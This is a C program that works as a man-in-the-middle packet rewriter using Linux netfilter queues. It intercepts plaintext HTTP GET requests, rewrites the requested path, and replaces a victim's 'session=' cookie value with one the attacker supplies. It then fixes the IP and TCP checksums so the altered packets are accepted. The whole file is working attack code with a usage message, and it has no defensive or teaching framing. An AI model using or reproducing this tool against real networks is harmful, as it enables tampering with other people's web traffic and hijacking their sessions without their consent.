#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

struct ctx {
    const char *from_path;
    const char *to_path;
    int path_len;
    const char *from_secret;
    const char *to_secret;
    int secret_len;  /* length of the secret VALUE (not including "secret=") */
};

/* Standard internet checksum (RFC 1071) */
static uint16_t inet_checksum(const void *data, int len) {
    const uint16_t *ptr = data;
    uint32_t sum = 0;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1)
        sum += *(const uint8_t *)ptr;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

static void fix_ip_checksum(struct iphdr *ip) {
    ip->check = 0;
    ip->check = inet_checksum(ip, ip->ihl * 4);
}

static void fix_tcp_checksum(struct iphdr *ip, uint8_t *tcp_start, int tcp_len) {
    struct tcphdr *tcp = (struct tcphdr *)tcp_start;
    tcp->check = 0;

    /* Build the TCP pseudo-header for checksum calculation */
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t  zero;
        uint8_t  proto;
        uint16_t len;
    } pseudo = {
        .src   = ip->saddr,
        .dst   = ip->daddr,
        .zero  = 0,
        .proto = IPPROTO_TCP,
        .len   = htons(tcp_len),
    };

    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)&pseudo;
    for (int i = 0; i < (int)(sizeof(pseudo) / 2); i++)
        sum += p[i];

    p = (const uint16_t *)tcp_start;
    int remaining = tcp_len;
    while (remaining > 1) {
        sum += *p++;
        remaining -= 2;
    }
    if (remaining == 1)
        sum += *(const uint8_t *)p;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    tcp->check = ~sum;
}

static int packet_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                     struct nfq_data *nfad, void *userdata)
{
    (void)nfmsg;
    struct ctx *ctx = userdata;
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfad);
    uint32_t id = ntohl(ph->packet_id);

    unsigned char *pkt;
    int pkt_len = nfq_get_payload(nfad, &pkt);
    if (pkt_len < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    struct iphdr *ip = (struct iphdr *)pkt;
    if (ip->protocol != IPPROTO_TCP)
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    int ip_hlen  = ip->ihl * 4;
    int ip_total = ntohs(ip->tot_len);
    uint8_t *tcp_start = pkt + ip_hlen;
    struct tcphdr *tcp = (struct tcphdr *)tcp_start;
    int tcp_hlen = tcp->doff * 4;
    int tcp_len  = ip_total - ip_hlen;

    uint8_t *http     = tcp_start + tcp_hlen;
    int      http_len = tcp_len - tcp_hlen;

    if (http_len < 5 || memcmp(http, "GET ", 4) != 0)
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    int modified = 0;

    /* Copy the packet so we can patch it */
    unsigned char new_pkt[65536];
    memcpy(new_pkt, pkt, pkt_len);
    uint8_t *new_http = new_pkt + (http - pkt);

    /* --- Path replacement --- */
    if (ctx->path_len > 0) {
        uint8_t *path_start = new_http + 4;
        int      path_room  = http_len - 4;
        uint8_t *path_end   = memchr(path_start, ' ', path_room);

        if (path_end) {
            int actual_len = path_end - path_start;
            if (actual_len == ctx->path_len &&
                memcmp(path_start, ctx->from_path, ctx->path_len) == 0) {
                printf("Path:   GET %.*s  →  GET %s\n",
                       actual_len, path_start, ctx->to_path);
                memcpy(path_start, ctx->to_path, ctx->path_len);
                modified = 1;
            }
        }
    }

    /* --- Cookie secret= replacement --- */
    if (ctx->secret_len > 0) {
        /* Build the needle "session=<from_secret>" */
        char needle[256];
        int needle_len = snprintf(needle, sizeof(needle), "session=%s", ctx->from_secret);

        /* Search in the HTTP payload */
        uint8_t *p = new_http;
        int remaining = http_len;
        while (remaining >= needle_len) {
            uint8_t *found = memchr(p, 's', remaining);
            if (!found) break;
            int left = remaining - (found - p);
            if (left >= needle_len && memcmp(found, needle, needle_len) == 0) {
                uint8_t *val_start = found + 8; /* skip "session=" (8 bytes) */
                printf("Cookie: session=%.*s  →  session=%s\n",
                       ctx->secret_len, val_start, ctx->to_secret);
                memcpy(val_start, ctx->to_secret, ctx->secret_len);
                modified = 1;
                break;
            }
            p = found + 1;
            remaining = http_len - (p - new_http);
        }
    }

    if (!modified)
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    /* Recompute checksums */
    struct iphdr *new_ip = (struct iphdr *)new_pkt;
    fix_ip_checksum(new_ip);
    fix_tcp_checksum(new_ip, new_pkt + ip_hlen, tcp_len);

    return nfq_set_verdict(qh, id, NF_ACCEPT, pkt_len, new_pkt);
}

int main(int argc, char *argv[]) {
    if (argc != 3 && argc != 5) {
        fprintf(stderr, "Usage: %s <from_path> <to_path> [<from_secret> <to_secret>]\n", argv[0]);
        fprintf(stderr, "  All substitutions must be the same length.\n");
        fprintf(stderr, "  Path example:   %s /original /replaced\n", argv[0]);
        fprintf(stderr, "  Cookie example: %s / / abc123 xyz789\n", argv[0]);
        return 1;
    }

    int from_len = strlen(argv[1]);
    int to_len   = strlen(argv[2]);
    if (from_len != to_len) {
        fprintf(stderr,
                "Error: paths must be the same length (%d vs %d).\n"
                "Different lengths desync TCP sequence numbers.\n",
                from_len, to_len);
        return 1;
    }

    struct ctx ctx = {
        .from_path   = argv[1],
        .to_path     = argv[2],
        .path_len    = from_len,
        .from_secret = NULL,
        .to_secret   = NULL,
        .secret_len  = 0,
    };

    if (argc == 5) {
        int fs_len = strlen(argv[3]);
        int ts_len = strlen(argv[4]);
        if (fs_len != ts_len) {
            fprintf(stderr,
                    "Error: secret values must be the same length (%d vs %d).\n",
                    fs_len, ts_len);
            return 1;
        }
        ctx.from_secret = argv[3];
        ctx.to_secret   = argv[4];
        ctx.secret_len  = fs_len;
    }

    printf("MITM active:\n");
    if (ctx.path_len > 0)
        printf("  Path:   GET %s  →  GET %s\n", argv[1], argv[2]);
    if (ctx.secret_len > 0)
        printf("  Cookie: session=%s  →  session=%s\n", ctx.from_secret, ctx.to_secret);
    printf("Waiting for packets on NFQUEUE 0...\n");

    struct nfq_handle *h = nfq_open();
    if (!h) { perror("nfq_open"); return 1; }

    if (nfq_bind_pf(h, AF_INET) < 0) { perror("nfq_bind_pf"); return 1; }

    struct nfq_q_handle *qh = nfq_create_queue(h, 0, &packet_cb, &ctx);
    if (!qh) { perror("nfq_create_queue"); return 1; }

    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        perror("nfq_set_mode"); return 1;
    }

    int fd = nfq_fd(h);
    unsigned char buf[65536] __attribute__((aligned(8)));
    int rv;
    while ((rv = recv(fd, buf, sizeof(buf), 0)) > 0)
        nfq_handle_packet(h, (char *)buf, rv);

    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}
